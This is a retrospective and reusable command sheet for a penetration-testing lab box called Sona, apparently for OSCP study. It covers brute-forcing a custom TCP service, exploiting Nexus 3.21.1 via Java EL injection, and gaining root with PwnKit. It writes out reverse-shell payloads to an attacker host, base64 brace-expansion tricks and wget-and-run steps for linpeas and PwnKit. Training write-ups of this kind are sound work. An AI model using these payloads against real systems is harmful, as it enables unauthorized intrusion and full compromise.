title: Sona Retrospective — Seven Lessons from a Custom-TCP + Java EL Chain
body:
Sona was a textbook custom-service brute-force into Java EL injection into PwnKit chain. Three distinct techniques, all well-documented, all solvable with manual exploitation (no Metasploit needed). The methodology worked end-to-end but the difference between 'cleanly executed in 90 minutes' and 'spent 3 hours on the proxy debug' was specific decisions about *where* to spend time.

Final proof: root via PwnKit.

— THE FOOTHOLD CHAIN — IN ORDER —

  1. Nmap → ports 23 (telnet?) + 8081 (Nexus Repository Manager 3.21.1)
  2. Manual nc to port 23 → custom NEXUS BACKUP MANAGER menu service
     → HINT command revealed: zodiac sign + favorite color
  3. Built two expect scripts (zodiac.sh, colors.sh) → wordlists from SecLists
     → ANSONE = leo, ANSTWO = black
  4. RECOVER blackleo → 3e409e89-514c-4f9f-955e-dfa5c4083518
  5. Nexus 3.21.1 = CVE-2020-10199 → searchsploit 49385 (Python PoC)
  6. Edited PoC: wrong host, Windows payload, no proxy support — fixed via Burp Comparer
  7. Ping-tested RCE first (tcpdump tun0 icmp confirmed) — then ncat reverse shell
  8. Stabilized shell → linpeas → pkexec SUID flagged → PwnKit → root

— LESSONS —

IDENTIFY UNRECOGNIZED SERVICES BEFORE DECIDING THEY'RE BROKEN:
  Nmap reported port 23 as 'telnet?' with a fingerprint mismatch. The instinct
  is to skip it as misconfigured. The correct move is `nc -nv $ip $port` and
  read what the service actually says. NEXUS BACKUP MANAGER is not on any
  default port list — it's a custom puzzle interface. Three minutes of manual
  interaction told me everything: menu structure, success/failure signals, that
  the connection drops on Incorrect. That's everything a script needs.

WRITE THE SCRIPT EVEN IF THE WORDLIST IS SHORT:
  Twelve zodiac signs and ~140 HTML color names. Could be done by hand in
  under an hour. But: writing the expect template forces you to understand
  the protocol's exact state machine, you learn the connection-drops-on-fail
  behavior that becomes important later, and the script is reusable for any
  future menu-driven service. The 20 minutes spent writing zodiac.sh paid
  back the next time I saw this pattern.

LOCATE SECLISTS BEFORE BUILDING YOUR OWN WORDLIST:
  My first instinct was to type out 12 zodiac signs by hand. Then I ran
  `locate seclists | grep -i color` and found html-colors.txt right there.
  SecLists has lists for sports teams, US states, common food, security
  question answers — anywhere a 'what is your X' prompt appears, someone
  has built a wordlist. Always check first.

PING-TEST RCE BEFORE DEBUGGING REVERSE SHELLS:
  The Nexus PoC said 'Command executed' for both my Windows `cmd.exe` payload
  AND the Linux ping. That message only means the injection reached the EL
  evaluator — not that the command did what I expected. Switching to
  `ping -c 4 $lhost` + `tcpdump -i tun0 icmp` gave me unambiguous confirmation:
  RCE works, target routes back to me, payload is what's broken. Every minute
  spent on reverse-shell debugging without this confirmation is wasted.

BURP COMPARER IS THE TOOL FOR FIXING BROKEN POCS:
  PoC returned 403 on login. Browser login with same creds returned 204.
  Comparer (Words) showed two differences instantly: hardcoded Host
  (192.168.1.1) and stale password (the author's test password, not mine).
  90 seconds from observation to fix. Without Comparer, this is 20 minutes
  of squinting at raw HTTP. Add `proxies={'http':'http://127.0.0.1:8080',...}`
  to any python requests-based exploit before running it the first time.

RUNTIME.EXEC() DOES NOT INVOKE A SHELL:
  This is THE gotcha for Java EL injection RCE. `bash -c 'bash -i >& /dev/tcp/...'`
  fails silently because Java tokenizes on spaces and the redirection (`>&`)
  is passed as a literal argument, not interpreted. Three working approaches:
    1. `ncat $lhost 443 -e /bin/bash` — no shell metacharacters needed
    2. Brace expansion: `bash -c {echo,BASE64}|{base64,-d}|{bash,-i}`
    3. Drop a script to /tmp first, then execute it
  This same gotcha applies to any Java RCE primitive: Log4Shell, Spring4Shell,
  Tomcat manager upload. Memorize the workarounds once.

LINPEAS → PWNKIT IS A MUSCLE-MEMORY CHAIN ON UBUNTU:
  Ubuntu boxes prior to ~2022 have unpatched polkit. Linpeas flags it
  explicitly: 'Pkexec binary has SUID bit set! pkexec version 0.105'.
  No 'figure out what to do' phase — wget the PwnKit binary from your
  saved scripts dir, chmod +x, run. Root in 30 seconds. Keep PwnKit
  (and PwnKit32 for x86 targets) in ~/scripts/ permanently.
cmd:
# ── REUSABLE SONA-PATTERN CHAIN ───────────────────────

# Stage 1 — manual probe of unrecognized service
nc -nv $ip $port
# Read the menu carefully. Look for: command list, HINT/HELP, success vs fail signals.

# Stage 2 — expect script for menu-driven brute force (template in bruteforce_custom_tcp)
chmod +x brute.sh
./brute.sh $ip $port wordlist.txt

# Wordlist sources:
locate seclists | grep -iE 'color|zodiac|sport|food|state'
ls /usr/share/seclists/Miscellaneous/Security-Question-Answers/

# Stage 3 — identify CVE for found service
curl -sI http://$ip:$port | grep -i server         # version banner
searchsploit nexus repository                       # match version
searchsploit -m 49385                               # grab the PoC

# Stage 4 — add Burp proxy support to ANY python PoC
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
# Then every s.post()/s.get() gets: proxies=proxies, verify=False

# Stage 5 — Burp Comparer workflow for broken PoC debugging
# 1. Run PoC through Burp (proxy set above)
# 2. Reproduce same step manually in Burp embedded browser
# 3. Right-click both → Send to Comparer (request)
# 4. Compare → Words → fix highlighted diffs in PoC

# Stage 6 — ALWAYS ping-test RCE before reverse shell debugging
sudo tcpdump -i tun0 icmp                          # terminal 1
# Payload: ping -c 4 $lhost
# If ICMP arrives, RCE works. If not, no payload variation will succeed.

# Stage 7 — Java RCE-safe reverse shell payloads
# Option A — ncat (cleanest, no shell metacharacters):
CMD='ncat $lhost 443 -e /bin/bash'

# Option B — base64 with brace expansion (when ncat unavailable):
echo -n 'bash -i >& /dev/tcp/$lhost/443 0>&1' | base64 -w0
# Then: CMD='bash -c {echo,BASE64HERE}|{base64,-d}|{bash,-i}'

# Stage 8 — stabilize shell IMMEDIATELY on landing
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl-Z; stty raw -echo; fg; reset

# Stage 9 — linpeas + PwnKit on Ubuntu
wget http://$lhost/linpeas.sh -O /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh | tee /tmp/linpeas.out
grep -A2 'Pkexec\|polkit' /tmp/linpeas.out

# If flagged:
wget http://$lhost/PwnKit -O /tmp/PwnKit
chmod +x /tmp/PwnKit && /tmp/PwnKit
# id → uid=0(root)

# ── TIME BUDGET (what should take how long) ───────────
# Service identification (nc + read):        5 min
# Expect script writing:                     15 min
# Brute force runs (both):                   2 min
# CVE identification:                        5 min
# PoC fixing (host, creds, payload, proxy):  20 min
# Reverse shell debugging (with ping test):  10 min
# Shell stabilization:                       2 min
# Linpeas + PwnKit:                          5 min
# TOTAL:                                     ~65 min
#
# If you're past 90 min on Sona, you've gone down a wrong path.
# Most common rabbit holes: ignoring port 23, debugging the wrong
# reverse shell variant before ping-testing, missing the Burp Comparer step.
warn: The Sona chain is a near-perfect template for OSCP-style boxes: weird-banner service → manual brute → CVE in service running on standard port → manual exploit modification → ubuntu-era PwnKit. Internalize the SHAPE of this chain. The specifics (Nexus 3.21.1, polkit 0.105) will change. The shape — 'identify, automate brute, fix PoC, ping-test, stabilize, linpeas, PwnKit' — repeats across many lab boxes.

choices.label: Apply custom-TCP brute force on a new box
Apply Nexus EL injection on a new box
Apply Burp Comparer to a different broken PoC
Apply PwnKit privesc on a new box
